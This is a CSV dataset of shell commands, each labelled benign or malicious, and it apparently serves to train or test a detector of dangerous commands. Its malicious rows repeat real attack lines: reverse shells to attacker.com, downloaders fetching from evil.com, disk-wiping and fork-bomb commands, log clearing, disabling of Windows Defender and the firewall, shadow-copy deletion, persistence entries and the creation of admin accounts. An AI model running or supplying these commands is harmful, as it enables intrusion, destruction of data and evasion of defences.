command,label
w > output.txt,benign
awk '{print $1}' data.txt > output.txt,benign
sort data.txt | head -5,benign
history,benign
umount /dev/sdb1,benign
wevtutil cl System 2>&1,malicious
rm -rf /,malicious
cipher /w:C:\,malicious
service apache2 status,benign
pip list,benign
curl -I https://google.com,benign
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
nc -l -p 4444 -e /bin/bash,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
diskpart select disk 0 clean &,malicious
free -m,benign
git clone https://github.com/user/repo.git 2>/dev/null,benign
kubectl get pods,benign
mkdir -p /tmp/test,benign
uptime,benign
awk '{print $1}' data.txt | head -5,benign
sdelete -p 10 -s -z C:\,malicious
cmd /c del /q /s C:\*,malicious
sort data.txt 2>/dev/null,benign
iptables -L,benign
"nohup perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
sc stop Windows Defender,malicious
tail -f /var/log/syslog,benign
git pull origin main,benign
curl -I https://google.com,benign
date,benign
chmod 777 /etc/shadow >/dev/null,malicious
find /home -name '*.txt' --help,benign
git pull origin main --help,benign
man ls | head -5,benign
git clone https://github.com/user/repo.git,benign
groups user,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
history,benign
userdel olduser,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
(:(){ :|:& };:),malicious
wget http://malicious.com/malware.exe,malicious
cmd /c del /q /s C:\*,malicious
docker ps > output.txt,benign
format C: /q /x >/dev/null,malicious
csc -target:library file.cs > output.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
rm -rf / &,malicious
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sdelete -p 10 -s -z C:\,malicious
du -sh /var/log,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
history,benign
rmdir empty_folder,benign
net user hacker password123 /add,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
ls -la > output.txt,benign
:(){ :|:& };:,malicious
scp file.txt user@server:/path/,benign
which python --help,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
netsh advfirewall set allprofiles state off,malicious
format C: /q /x,malicious
service apache2 status > output.txt,benign
tar -czf backup.tar.gz /data -v,benign
taskkill /f /im antimalware.exe,malicious
df -h --help,benign
tar -czf backup.tar.gz /data | head -5,benign
cat /dev/urandom > /dev/sda,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
node --version,benign
(sdelete -p 10 -s -z C:\),malicious
node --version,benign
groups user,benign
rm -rf /,malicious
iostat,benign
rmdir empty_folder --help,benign
ssh user@server.com,benign
timeout 60 cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
docker images | head -5,benign
uniq sorted.txt,benign
finger user,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
python --version | head -5,benign
which python 2>/dev/null,benign
nohup certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
csc -target:library file.cs,benign
csc -target:library file.cs,benign
ss -tulpn,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
wevtutil cl Security,malicious
mshta javascript:alert('code execution'),malicious
format C: /q /x,malicious
kubectl get pods,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
net localgroup administrators hacker /add,malicious
kubectl get pods > output.txt,benign
chmod 777 /etc/shadow,malicious
systemctl status nginx,benign
chmod 777 /etc/shadow,malicious
df -h,benign
pip list -v,benign
shutdown /r /f /t 0,malicious
:(){ :|:& };:,malicious
chmod 755 script.sh -v,benign
mkfs.ext4 /dev/sda1 2>&1,malicious
df -h,benign
wget http://malicious.com/malware.exe,malicious
pwd,benign
sort data.txt,benign
ls -la,benign
diskpart select disk 0 clean,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
whoami,benign
sed 's/old/new/g' file.txt,benign
dd if=/dev/zero of=/dev/sda 2>&1,malicious
netsh advfirewall set allprofiles state off,malicious
chmod 777 /etc/shadow,malicious
git clone https://github.com/user/repo.git,benign
mkdir -p /tmp/test,benign
dd if=/dev/zero of=/dev/sda 2>&1,malicious
groups user,benign
net user hacker password123 /add,malicious
scp file.txt user@server:/path/,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
service apache2 status,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
timeout 60 shutdown /r /f /t 0,malicious
wget http://malicious.com/malware.exe,malicious
timeout 60 echo 'virus' > /etc/passwd,malicious
iptables -L,benign
sc stop Windows Defender,malicious
ping -c 4 google.com,benign
shutdown /r /f /t 0 >/dev/null,malicious
nslookup google.com,benign
df -h,benign
diskpart select disk 0 clean 2>&1,malicious
"cut -d',' -f1 data.csv",benign
python --version,benign
echo 'virus' > /etc/passwd >/dev/null,malicious
mkfs.ext4 /dev/sda1,malicious
useradd newuser,benign
chmod 755 script.sh 2>/dev/null,benign
format C: /q /x,malicious
whoami,benign
chmod 755 script.sh > output.txt,benign
netsh advfirewall set allprofiles state off,malicious
sudo grep pattern file.txt,benign
rsync -av /src/ /dst/ | head -5,benign
groups user,benign
htop,benign
git clone https://github.com/user/repo.git,benign
diskpart select disk 0 clean,malicious
crontab -l,benign
netsh advfirewall set allprofiles state off,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
certutil -hashfile file.txt SHA256,benign
rsync -av /src/ /dst/ > output.txt,benign
certutil -hashfile file.txt SHA256,benign
msbuild project.csproj,benign
net localgroup administrators hacker /add,malicious
timeout 60 nc -l -p 4444 -e /bin/bash,malicious
wget http://malicious.com/malware.exe,malicious
diskpart select disk 0 clean,malicious
type ls --help,benign
powershell Get-Process,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
diskpart select disk 0 clean 2>&1,malicious
java -version,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
wget http://malicious.com/malware.exe,malicious
ping -c 4 google.com,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
timeout 60 wevtutil cl System,malicious
nohup format C: /q /x,malicious
net localgroup administrators hacker /add,malicious
ncat -lvp 443 -e cmd.exe,malicious
cmd /c del /q /s C:\*,malicious
id user --help,benign
nohup chmod 777 /etc/shadow,malicious
node --version,benign
timeout 60 sc stop Windows Defender,malicious
sudo yum list installed,benign
netsh advfirewall set allprofiles state off,malicious
chmod 755 script.sh,benign
chmod 777 /etc/shadow,malicious
echo 'virus' > /etc/passwd,malicious
sdelete -p 10 -s -z C:\,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
lsblk,benign
timeout 60 sc stop Windows Defender,malicious
pwd > output.txt,benign
whoami,benign
groups user -v,benign
lsblk,benign
git clone https://github.com/user/repo.git,benign
scp file.txt user@server:/path/,benign
net localgroup administrators hacker /add,malicious
top,benign
git clone https://github.com/user/repo.git,benign
netsh advfirewall set allprofiles state off,malicious
csc -target:library file.cs,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= 2>&1,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
powershell Get-Process,benign
sudo free -m,benign
passwd user,benign
docker images 2>/dev/null,benign
attrib +h +s malware.exe,malicious
"timeout 60 socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
(mkfs.ext4 /dev/sda1),malicious
head -10 logfile.txt,benign
echo 'virus' > /etc/passwd,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
type ls,benign
last,benign
dd if=/dev/zero of=/dev/sda,malicious
chown user:group file.txt | head -5,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
vssadmin delete shadows /all /quiet,malicious
ssh user@server.com --help,benign
net user hacker password123 /add,malicious
htop 2>/dev/null,benign
wevtutil cl Security,malicious
git clone https://github.com/user/repo.git,benign
wevtutil cl Security,malicious
docker ps > output.txt,benign
nohup cat /dev/urandom > /dev/sda,malicious
finger user,benign
python --version,benign
nohup taskkill /f /im antimalware.exe,malicious
cmd /c del /q /s C:\*,malicious
csc -target:library file.cs,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
format C: /q /x,malicious
tar -czf backup.tar.gz /data,benign
echo 'virus' > /etc/passwd,malicious
htop,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
awk '{print $1}' data.txt,benign
netstat -tulpn,benign
wevtutil cl System &,malicious
java -version,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll > output.txt,benign
mkfs.ext4 /dev/sda1 2>&1,malicious
cat /etc/passwd,benign
chmod 755 script.sh,benign
sc stop Windows Defender,malicious
python --version,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
tar -czf backup.tar.gz /data | head -5,benign
nohup mshta javascript:alert('code execution'),malicious
net user hacker password123 /add,malicious
ss -tulpn,benign
systemctl status nginx,benign
rmdir empty_folder,benign
w,benign
net user hacker password123 /add,malicious
certutil -hashfile file.txt SHA256,benign
crontab -l,benign
wget http://malicious.com/malware.exe,malicious
systemctl reload nginx,benign
find /home -name '*.txt',benign
head -10 logfile.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
mkfs.ext4 /dev/sda1,malicious
ncat -lvp 443 -e cmd.exe,malicious
free -m > output.txt,benign
cp file1.txt file2.txt > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
chmod 777 /etc/shadow,malicious
tar -czf backup.tar.gz /data,benign
awk '{print $1}' data.txt,benign
net user hacker password123 /add,malicious
wevtutil cl Security,malicious
find /home -name '*.txt' > output.txt,benign
which python,benign
chown user:group file.txt --help,benign
java -version,benign
id user,benign
w,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
certutil -hashfile file.txt SHA256,benign
ss -tulpn,benign
sc stop Windows Defender,malicious
umount /dev/sdb1,benign
nohup ncat -lvp 443 -e cmd.exe,malicious
rm -rf /,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
whoami,benign
vssadmin delete shadows /all /quiet,malicious
vssadmin delete shadows /all /quiet,malicious
format C: /q /x &,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
rm -rf /,malicious
:(){ :|:& };:,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
pip list,benign
nohup taskkill /f /im antimalware.exe,malicious
nohup dd if=/dev/zero of=/dev/sda,malicious
sudo wc -l document.txt,benign
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
find /home -name '*.txt',benign
type ls -v,benign
df -h,benign
msbuild project.csproj,benign
ps aux,benign
diskpart select disk 0 clean,malicious
dd if=/dev/zero of=/dev/sda,malicious
w,benign
passwd user,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
iptables -L,benign
(net localgroup administrators hacker /add),malicious
systemctl status nginx,benign
taskkill /f /im antimalware.exe &,malicious
finger user,benign
wget http://malicious.com/malware.exe,malicious
docker images -v,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
echo 'Hello World',benign
git clone https://github.com/user/repo.git -v,benign
passwd user,benign
sudo ps aux,benign
echo 'virus' > /etc/passwd >/dev/null,malicious
mkfs.ext4 /dev/sda1,malicious
systemctl reload nginx,benign
(mkfs.ext4 /dev/sda1),malicious
ls -la,benign
groups user,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
sudo ping -c 4 google.com,benign
traceroute google.com,benign
find /home -name '*.txt',benign
format C: /q /x,malicious
format C: /q /x,malicious
htop,benign
sudo usermod -aG sudo user,benign
netsh advfirewall set allprofiles state off,malicious
sdelete -p 10 -s -z C:\,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
systemctl reload nginx,benign
last,benign
format C: /q /x,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
dd if=/dev/zero of=/dev/sda,malicious
chown user:group file.txt | head -5,benign
ps aux,benign
:(){ :|:& };:,malicious
userdel olduser > output.txt,benign
mv old.txt new.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
rm -rf /,malicious
history --help,benign
scp file.txt user@server:/path/,benign
systemctl reload nginx,benign
yum list installed -v,benign
wc -l document.txt | head -5,benign
rm -rf /,malicious
who,benign
apt list --installed --help,benign
whoami,benign
systemctl reload nginx --help,benign
lsblk,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
pwd,benign
mount,benign
chmod 777 /etc/shadow,malicious
rmdir empty_folder,benign
ss -tulpn,benign
find /home -name '*.txt',benign
mkdir -p /tmp/test,benign
nohup shutdown /r /f /t 0,malicious
nohup wevtutil cl System,malicious
net localgroup administrators hacker /add 2>&1,malicious
chmod 777 /etc/shadow 2>&1,malicious
history > output.txt,benign
git clone https://github.com/user/repo.git,benign
sdelete -p 10 -s -z C:\,malicious
timeout 60 cmd /c del /q /s C:\*,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
netstat -tulpn,benign
curl http://evil.com/payload.sh | bash,malicious
head -10 logfile.txt --help,benign
(nc -l -p 4444 -e /bin/bash),malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
cp file1.txt file2.txt,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
systemctl status nginx,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
shutdown /r /f /t 0,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
netsh advfirewall set allprofiles state off,malicious
ls -la,benign
ssh user@server.com,benign
sed 's/old/new/g' file.txt,benign
finger user,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe >/dev/null,malicious
service apache2 status --help,benign
wevtutil cl Security,malicious
echo 'virus' > /etc/passwd 2>&1,malicious
nohup nc -l -p 4444 -e /bin/bash,malicious
cat /dev/urandom > /dev/sda,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
which python,benign
find /home -name '*.txt',benign
sort data.txt --help,benign
ls -la,benign
:(){ :|:& };:,malicious
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
wc -l document.txt,benign
vssadmin delete shadows /all /quiet,malicious
docker images,benign
vssadmin delete shadows /all /quiet,malicious
grep pattern file.txt,benign
diskpart select disk 0 clean,malicious
touch newfile.txt,benign
rsync -av /src/ /dst/ --help,benign
systemctl status nginx,benign
df -h,benign
powershell Get-Process,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
ncat -lvp 443 -e cmd.exe,malicious
chmod 777 /etc/shadow 2>&1,malicious
certutil -hashfile file.txt SHA256 | head -5,benign
"cut -d',' -f1 data.csv",benign
which python,benign
ncat -lvp 443 -e cmd.exe,malicious
service apache2 status,benign
timeout 60 sc stop Windows Defender,malicious
scp file.txt user@server:/path/ | head -5,benign
vssadmin delete shadows /all /quiet 2>&1,malicious
shutdown /r /f /t 0 2>&1,malicious
umount /dev/sdb1 -v,benign
systemctl reload nginx -v,benign
usermod -aG sudo user,benign
msbuild project.csproj,benign
net user hacker password123 /add,malicious
who,benign
(shutdown /r /f /t 0),malicious
timeout 60 wevtutil cl Security,malicious
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
rm -rf /,malicious
wget http://malicious.com/malware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
rm -rf /,malicious
iostat 2>/dev/null,benign
(wevtutil cl System),malicious
wevtutil cl System,malicious
htop,benign
rm -rf /,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sort data.txt,benign
(nc -l -p 4444 -e /bin/bash),malicious
curl http://evil.com/payload.sh | bash,malicious
"python -c 'import os; os.system(""rm -rf /"")' >/dev/null",malicious
npm list,benign
dd if=/dev/zero of=/dev/sda,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
cipher /w:C:\,malicious
sort data.txt,benign
uptime,benign
umount /dev/sdb1,benign
echo 'virus' > /etc/passwd,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
awk '{print $1}' data.txt,benign
w,benign
cipher /w:C:\,malicious
(cipher /w:C:\),malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wget http://malicious.com/malware.exe,malicious
systemctl status nginx,benign
shutdown /r /f /t 0,malicious
git clone https://github.com/user/repo.git,benign
:(){ :|:& };:,malicious
scp file.txt user@server:/path/,benign
scp file.txt user@server:/path/,benign
vssadmin delete shadows /all /quiet 2>&1,malicious
mkfs.ext4 /dev/sda1,malicious
net localgroup administrators hacker /add,malicious
history,benign
java -version --help,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
"(perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");')",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
ps aux,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
docker ps,benign
wevtutil cl Security,malicious
mount,benign
